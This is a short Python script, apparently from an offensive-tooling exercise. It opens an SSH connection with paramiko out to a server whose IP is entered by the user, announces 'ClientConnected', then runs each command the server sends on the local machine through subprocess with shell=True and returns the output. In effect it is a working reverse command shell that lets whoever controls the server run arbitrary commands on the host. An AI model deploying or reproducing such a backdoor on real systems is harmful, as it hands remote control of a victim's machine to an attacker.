import paramiko    # Paramiko must be installed on the machine running this script.
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        # Sends a basic message ('ClientConnected') to the server supplied in main to notify server.
        ssh_session.send(command)

        print(ssh_session.recv(1024).decode())
        while True:
            # Waits for a command from the SSH server
            command = ssh_session.recv(1024)
            try:
                # Decodes the received command and runs it if it is not stating 'exit'.
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return
if __name__ == '__main__':
    import getpass
    # user = getpass.getuser()
    user = input('username: ')
    password = getpass.getpass()
    ip = input('Enter server IP: ') or '192.168.10.50'
    port = input('Enter port: ') or 2222

    # Opens a session and sends a message ('ClientConnected') to notify server.
    ssh_command(ip, port, user, password, 'ClientConnected')
